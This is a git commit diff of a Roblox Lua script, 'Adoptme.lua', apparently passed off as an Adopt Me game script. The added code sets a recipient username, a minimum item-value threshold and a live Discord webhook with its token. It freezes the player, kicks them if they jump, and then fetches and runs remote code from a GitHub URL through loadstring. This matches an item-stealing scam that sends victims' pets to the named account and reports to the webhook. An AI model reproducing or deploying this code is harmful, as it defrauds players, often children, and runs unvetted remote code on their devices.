59dec52861006aafe7f08642acb66b10c25ce3d5
vitolkn <vitolkn99@gmail.com>
2025-01-17 23:31:38 -0300

    Update Adoptme.lua

--- Adoptme.lua
+++ Adoptme.lua
@@ -1,9 +1,27 @@
+-- Configurações
 Username = "vitinZzica"
-WebHook = "https://discord.com/api/webhooks/1329821086803562538/i5sf01tUaufaTbcgIW9bO40Er40psEixwoAiK-4bnSZJhkEZDCsB7jCqIcjZ5QxE4E53"
+Username2 = "vitinZzica"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"
 
-_G.CustomScriptName = "Coen"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+-- Função de kick por pular
+local function kickout()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    humanoid.JumpPower = 0
+    humanoid.WalkSpeed = 0
+
+    while wait() do
+        if humanoid.Jump == true then
+            game.Players.LocalPlayer:Kick("You jumped")
+        end
+    end
+end
+
+-- Executa a função de kick
+kickout()
+
+-- Carrega o script externo
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
